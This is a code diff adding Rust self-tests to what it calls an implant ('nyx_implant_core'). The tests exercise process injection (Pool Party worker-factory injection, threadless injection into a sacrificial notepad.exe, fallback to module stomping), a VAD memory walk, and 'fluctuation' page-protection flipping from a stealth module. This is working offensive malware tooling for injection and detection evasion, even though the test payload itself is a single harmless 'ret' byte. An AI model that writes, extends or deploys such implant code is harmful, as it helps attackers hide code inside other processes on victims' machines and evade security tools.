@@ -589,6 +589,10 @@ pub unsafe extern "system" fn nyx_selftest_inject() {
 // bit1 = pool_party_inject returned Ok (section delivery + threadless
 //        worker-factory dispatch — NO remote thread is created),
 // bit2 = degraded with WARN prefix to module_stomp (section delivery ran).
+// bit3 = SKIP FLAG (not a pass): env skip — no worker-factory in the probe
+//        process, or OpenProcess failed (GLE=5 ACCESS_DENIED / pid gone).
+//        Distinct from 0x5 WARN-fail. Expected: 0x7 pass / 0x9 skip
+//        (bit0+bit3) / 0x5 WARN-fail. Never treat 0x9 as success.
 // The raw Err string (pool_party's own error, or the WARN-prefixed fallback
 // failure) is persisted to %TEMP%\nyx_g6_inject_pool.resp for VM triage;
 // %TEMP%\nyx_g6_inject_pool.target records which sacrificial image was used.
@@ -662,8 +666,11 @@ pub unsafe extern "system" fn nyx_selftest_inject_pool() {
             // The pool_party_inject Ok path prefixes with "Pool Party inject ok".
             // The degrade path prefixes with "WARN: Pool Party".
             let text = core::str::from_utf8(&bytes).unwrap_or("");
+            crate::selftests::write_marker("nyx_g6_inject_pool.resp", text);
             if text.contains("Pool Party inject ok") {
                 mask |= 1 << 1; // full section delivery + splice succeeded
+            } else if crate::tp::is_env_skip(text) {
+                mask |= 1 << 3; // env skip, not a product fail
             } else if text.contains("WARN: Pool Party") {
                 mask |= 1 << 2; // degraded to module_stomp (section delivery ran)
             }
@@ -673,6 +680,9 @@ pub unsafe extern "system" fn nyx_selftest_inject_pool() {
             // g6 diagnosis: persist the exact Err string (pool_party's own
             // error or the degraded method-2 fallback's) for VM triage.
             crate::selftests::write_marker("nyx_g6_inject_pool.resp", e.as_str());
+            if crate::tp::is_env_skip(e.as_str()) {
+                mask |= 1 << 3;
+            }
         }
         _ => {}
     }
@@ -817,6 +827,192 @@ pub unsafe extern "system" fn nyx_selftest_inject_fls() {
 }
 
 // ============================================================================
+// nyx_selftest_vad: R1 current-process VAD walk (Session-0 safe, no GUI).
+// Bits:
+//   0 = VirtualQuery walk ran (walked > 0)
+//   1 = at least one Image RX region observed (self image)
+//   2 = selftest scratch RX page was allocated, protected, then freed and
+//       does not remain as committed+EXECUTE at that address
+// Expected 0x7 on a healthy Windows host.
+// ============================================================================
+
+#[cfg(feature = "selftest")]
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_vad() {
+    let mut mask: u32 = 0;
+    let report = match unsafe { crate::vad::scan() } {
+        Some(r) => r,
+        None => unsafe { exit(mask) },
+    };
+    if report.walked > 0 {
+        mask |= 1 << 0;
+    }
+    if report.image_rx > 0 {
+        mask |= 1 << 1;
+    }
+
+    // Scratch: alloc RW → protect RX → free. bit2 asserts the scratch
+    // address is not left as committed executable (does not flag the
+    // implant's own PIC RX trampoline — we only check this address).
+    if let Some(fns) = unsafe { scratch_mem_fns() } {
+        let page = unsafe {
+            (fns.valloc)(
+                core::ptr::null(),
+                0x1000,
+                0x3000, // MEM_COMMIT | MEM_RESERVE
+                crate::stealth::payload_alloc_protect(),
+            )
+        };
+        if !page.is_null() {
+            let mut old: u32 = 0;
+            let _ = unsafe {
+                (fns.vprot)(
+                    page as *const _,
+                    0x1000,
+                    crate::stealth::desired_final_protect(),
+                    &mut old,
+                )
+            };
+            let saw_scratch = match unsafe { crate::vad::query_one(page as usize) } {
+                Some(r) => r.state == crate::vad::MEM_COMMIT && r.executable,
+                None => false,
+            };
+            let _ = unsafe { (fns.vfree)(page, 0, 0x8000) }; // MEM_RELEASE
+            let remains = match unsafe { crate::vad::query_one(page as usize) } {
+                Some(r) => r.state == crate::vad::MEM_COMMIT && r.executable,
+                None => false,
+            };
+            if saw_scratch && !remains {
+                mask |= 1 << 2;
+            }
+        }
+    }
+    unsafe { exit(mask) };
+}
+
+// ============================================================================
+// nyx_selftest_inject_threadless: SAFE prefix only — sacrificial create +
+// alloc/write/protect-to-RX + cleanup. Does NOT resume or RIP-hijack.
+// Payload is a 1-byte `ret` (0xC3). No foreign payload is executed.
+// Bits: 0 = sacrificial spawned, 1 = alloc+write+RX protect Ok, 2 = cleanup.
+// Expected 0x7 when CreateProcessW + syscall RT work.
+// ============================================================================
+
+#[cfg(feature = "selftest")]
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_inject_threadless() {
+    let mut mask: u32 = 0;
+    let rt = ensure_rt();
+    let proc = match crate::inject::create_sacrificial("notepad.exe") {
+        Ok(p) => p,
+        Err(_) => unsafe { exit(mask) },
+    };
+    mask |= 1 << 0;
+    let shellcode: [u8; 1] = [0xC3];
+    if let Some(rt) = rt {
+        match unsafe { crate::inject::threadless_inject_alloc(rt, proc.handle, &shellcode) } {
+            Ok(_) => mask |= 1 << 1,
+            Err(e) => crate::selftests::write_marker("nyx_g6_inject_threadless.resp", e),
+        }
+    }
+    if let Some(tp_addr) =
+        nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"TerminateProcess")
+    {
+        type TerminateProcess = unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> i32;
+        let terminate: TerminateProcess = unsafe { core::mem::transmute(tp_addr) };
+        let _ = unsafe { terminate(proc.handle, 1) };
+    }
+    core::mem::drop(proc);
+    mask |= 1 << 2;
+    unsafe { exit(mask) };
+}
+
+// ============================================================================
+// nyx_selftest_fluctuation: round-trip Fluctuation protect constants on a
+// tiny committed scratch page. NEVER flips the implant .text (hosted CI).
+// Bits: 0 = scratch committed, 1 = PAGE_NOACCESS protect Ok,
+//       2 = PAGE_EXECUTE_READ restore Ok.
+// Expected 0x7 when the syscall runtime is up.
+// ============================================================================
+
+#[cfg(feature = "selftest")]
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_fluctuation() {
+    let mut mask: u32 = 0;
+    let rt = match ensure_rt() {
+        Some(r) => r,
+        None => unsafe { exit(mask) },
+    };
+    let Some(fns) = (unsafe { scratch_mem_fns() }) else {
+        unsafe { exit(mask) };
+    };
+    let page = unsafe {
+        (fns.valloc)(
+            core::ptr::null(),
+            0x1000,
+            0x3000,
+            crate::stealth::payload_alloc_protect(),
+        )
+    };
+    if page.is_null() {
+        unsafe { exit(mask) };
+    }
+    mask |= 1 << 0;
+    let (noacc, rx) = crate::stealth::fluctuation_protect_pair();
+    let mut base = page as usize;
+    let mut size: usize = 0x1000;
+    let mut old: u32 = 0;
+    let noacc_ok = unsafe {
+        nyx_implant_core::syscalls::nt_protect_virtual_memory(
+            rt, &mut base, &mut size, noacc, &mut old,
+        )
+    }
+    .map(|st| st >= 0)
+    .unwrap_or(false);
+    if noacc_ok {
+        mask |= 1 << 1;
+    }
+    base = page as usize;
+    size = 0x1000;
+    let rx_ok = unsafe {
+        nyx_implant_core::syscalls::nt_protect_virtual_memory(
+            rt, &mut base, &mut size, rx, &mut old,
+        )
+    }
+    .map(|st| st >= 0)
+    .unwrap_or(false);
+    if rx_ok {
+        mask |= 1 << 2;
+    }
+    let _ = unsafe { (fns.vfree)(page, 0, 0x8000) };
+    unsafe { exit(mask) };
+}
+
+#[cfg(feature = "selftest")]
+struct ScratchMemFns {
+    valloc: unsafe extern "system" fn(
+        *const core::ffi::c_void,
+        usize,
+        u32,
+        u32,
+    ) -> *mut core::ffi::c_void,
+    vprot: unsafe extern "system" fn(*const core::ffi::c_void, usize, u32, *mut u32) -> i32,
+    vfree: unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32) -> i32,
+}
+
+#[cfg(feature = "selftest")]
+unsafe fn scratch_mem_fns() -> Option<ScratchMemFns> {
+    let valloc = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc")?;
+    let vprot = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualProtect")?;
+    let vfree = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualFree")?;
+    Some(ScratchMemFns {
+        valloc: core::mem::transmute(valloc),
+        vprot: core::mem::transmute(vprot),
+        vfree: core::mem::transmute(vfree),
+    })
+}
+
+// ============================================================================
 // nyx_selftest_crt_probe2 — g6 diagnosis (2026-08-22), TEMPORARY probe.
 // Isolation fix over nyx_selftest_crt_probe: probe1 ran all controls against
 // ONE target, but a control whose thread AV'd (exit 0xC0000005) terminated
@@ -855,7 +1051,12 @@ struct Crt2Fns {
         u32,
         *mut u32,
     ) -> i32,
-    vfx: unsafe extern "system" fn(*mut core::ffi::c_void, *mut core::ffi::c_void, usize, u32) -> i32,
+    vfx: unsafe extern "system" fn(
+        *mut core::ffi::c_void,
+        *mut core::ffi::c_void,
+        usize,
+        u32,
+    ) -> i32,
     wpm: unsafe extern "system" fn(
         *mut core::ffi::c_void,
         *mut core::ffi::c_void,
@@ -1127,7 +1328,19 @@ pub unsafe extern "system" fn nyx_selftest_crt_probe2() {
     let k32: &[u8] = b"kernel32.dll";
     let ntdll: &[u8] = b"ntdll.dll";
     let ea = |m: &[u8], n: &[u8]| unsafe { nyx_implant_core::resolve::export_addr(m, n) };
-    let (Some(op), Some(vax), Some(vpx), Some(vfx), Some(wpm), Some(crt), Some(wait), Some(gec), Some(gle), Some(close), Some(sleep)) = (
+    let (
+        Some(op),
+        Some(vax),
+        Some(vpx),
+        Some(vfx),
+        Some(wpm),
+        Some(crt),
+        Some(wait),
+        Some(gec),
+        Some(gle),
+        Some(close),
+        Some(sleep),
+    ) = (
         ea(k32, b"OpenProcess"),
         ea(k32, b"VirtualAllocEx"),
         ea(k32, b"VirtualProtectEx"),
@@ -1139,7 +1352,8 @@ pub unsafe extern "system" fn nyx_selftest_crt_probe2() {
         ea(k32, b"GetLastError"),
         ea(k32, b"CloseHandle"),
         ea(k32, b"Sleep"),
-    ) else {
+    )
+    else {
         unsafe { exit(0) };
     };
     let fns = Crt2Fns {
@@ -1314,7 +1528,19 @@ pub unsafe extern "system" fn nyx_selftest_crt_probe3() {
     let k32: &[u8] = b"kernel32.dll";
     let ntdll: &[u8] = b"ntdll.dll";
     let ea = |m: &[u8], n: &[u8]| unsafe { nyx_implant_core::resolve::export_addr(m, n) };
-    let (Some(op), Some(vax), Some(vpx), Some(vfx), Some(wpm), Some(crt), Some(wait), Some(gec), Some(gle), Some(close), Some(sleep)) = (
+    let (
+        Some(op),
+        Some(vax),
+        Some(vpx),
+        Some(vfx),
+        Some(wpm),
+        Some(crt),
+        Some(wait),
+        Some(gec),
+        Some(gle),
+        Some(close),
+        Some(sleep),
+    ) = (
         ea(k32, b"OpenProcess"),
         ea(k32, b"VirtualAllocEx"),
         ea(k32, b"VirtualProtectEx"),
@@ -1326,7 +1552,8 @@ pub unsafe extern "system" fn nyx_selftest_crt_probe3() {
         ea(k32, b"GetLastError"),
         ea(k32, b"CloseHandle"),
         ea(k32, b"Sleep"),
-    ) else {
+    )
+    else {
         unsafe { exit(0) };
     };
     let fns = Crt2Fns {
